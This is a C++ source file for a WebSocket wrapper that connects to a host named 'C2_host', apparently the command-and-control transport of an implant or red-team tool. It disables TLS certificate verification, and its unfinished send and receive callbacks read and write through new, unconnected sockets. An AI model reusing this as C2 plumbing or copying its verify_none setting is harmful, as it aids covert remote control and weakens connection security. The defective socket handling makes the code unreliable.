
#include "cid_websockets.h"


//#include "asio.hpp"


using websocketpp::lib::placeholders::_1;
using websocketpp::lib::placeholders::_2;
using websocketpp::lib::bind;

bool WebsocketsWrapper::connected = false;
std::mutex WebsocketsWrapper::mtx;
std::vector<unsigned char> WebsocketsWrapper::buffer;
WebsocketsWrapper::client::connection_ptr WebsocketsWrapper::con;

WebsocketsWrapper::WebsocketsWrapper(const char* C2_host, unsigned short C2_port)
{
    client ws_client;
    this->uri = "wss://" + std::string(C2_host) + ":" + std::to_string(C2_port);
    try {
        // Set logging to be pretty verbose (everything except message payloads)
        ws_client.set_access_channels(websocketpp::log::alevel::all);
        ws_client.clear_access_channels(websocketpp::log::alevel::frame_payload);
        ws_client.set_error_channels(websocketpp::log::elevel::all);
        ws_client.set_user_agent("test11111111");
        
        // Initialize ASIO
        ws_client.init_asio();

        // Register our message handler
        ws_client.set_message_handler(bind(&on_message, &ws_client, ::_1, ::_2));
        ws_client.set_tls_init_handler(bind(&on_tls_init, ::_1));

        websocketpp::lib::error_code ec;
        con = ws_client.get_connection(uri, ec);
        if (ec) {
            std::cout << "could not create connection because: " << ec.message() << std::endl;
            return;
        }

        // Note that connect here only requests a connection. No network messages are
        // exchanged until the event loop starts running in the next line.
        con = ws_client.connect(con);


        // ToDo: Calling like this works but using a new t
        //ws_client.run();

        // Start the ASIO io_service run loop in a new thread
        // this will cause a single connection to be made to the server. c.run()
        // will exit when this connection is closed.
        websocketpp::lib::thread cthread(websocketpp::lib::bind(&run, &ws_client));
        cthread.detach();
    }
    catch (websocketpp::exception const& e) {
        std::cout << e.what() << std::endl;
    }

   // WebsocketsWrapper::connected = true;
}

void WebsocketsWrapper::run(client* ws_client)
{
    ws_client->run();
}

int WebsocketsWrapper::recv_cb(socket_t socket, void* userdata, char* buffer, int size) {
    WebsocketsWrapper* ws_client = (WebsocketsWrapper*)userdata;
    websocketpp::lib::error_code ec;

    asio::ip::tcp::socket ws_socket(WebsocketsWrapper::con->get_raw_socket().get_io_context());
    size_t read_size = ws_socket.read_some(asio::buffer(buffer, size), ec);

    if (ec) {
        // ToDo: set the proper error code 
#ifdef _WIN32
        WSASetLastError(WSAEACCES); // https://docs.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
#else
        errno = ENOENT;
#endif // _WIN32

        std::cout << "Echo failed because: " << ec.message() << std::endl;

        return -1;
    }
    
    //    //int w = send(socket, buffer, size, 0);

    //WebsocketsWrapper::mtx.lock();
    //if (size >= int(ws_client->buffer.size())) { // We have enhough space in buffer
    //    memcpy(buffer, &ws_client->buffer[0], ws_client->buffer.size());
    //    //std::copy(ws_client->buffer.begin(), ws_client->buffer.end(), buffer);
    //    rc = ws_client->buffer.size();
    //    ws_client->buffer.clear();
    //}
    //else { // The read should be done in multiple times
    //    auto size_left = ws_client->buffer.size() - size;
    //    memcpy(buffer, &ws_client->buffer[0], size);
    //    rc = size;
    //}
    //WebsocketsWrapper::mtx.unlock();

    ////int rc = recv(socket, buffer, size, 0);
    return read_size;
}

int WebsocketsWrapper::send_cb(socket_t socket, void* userdata, const char* buffer, int size) {
    WebsocketsWrapper* ws_client = (WebsocketsWrapper*)userdata;
    websocketpp::lib::error_code ec;
    size_t sent_size = -1;

    asio::ip::tcp::socket ws_socket(WebsocketsWrapper::con->get_raw_socket().get_io_context());
    sent_size = ws_socket.write_some(asio::buffer(buffer, size), ec);
//
//    // ToDo: check the different operation codes websocketpp::frame::opcode::???
//    //ws_client->c.send(ws_client->con->get_handle(),std::string(buffer, size), websocketpp::frame::opcode::binary, ec);
//
    if (ec) {
        // ToDo: set the proper error code 
#ifdef _WIN32
        WSASetLastError(WSAEACCES); // https://docs.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
#else
        errno = ENOENT;
#endif // _WIN32

        std::cout << "Echo failed because: " << ec.message() << std::endl;
        return -1;
    }

//    //int w = send(socket, buffer, size, 0);
    return sent_size;
}

void WebsocketsWrapper::close_cb(socket_t socket, void* userdata) {
    // Should close the ws connection
}

WebsocketsWrapper::context_ptr WebsocketsWrapper::on_tls_init(websocketpp::connection_hdl)
{
    context_ptr ctx = websocketpp::lib::make_shared<asio::ssl::context>(asio::ssl::context::sslv23);
    ctx->set_verify_mode(asio::ssl::verify_none);
    return ctx;
}


void WebsocketsWrapper::on_message(client* c, websocketpp::connection_hdl hdl, message_ptr msg)
{
    auto data = msg->get_payload();
    //msg->get_raw_payload()

    /*WebsocketsWrapper::mtx.lock();
    std::copy(data.c_str(), data.c_str() + data.size(), std::back_inserter(WebsocketsWrapper::buffer));
    WebsocketsWrapper::mtx.unlock();*/
}
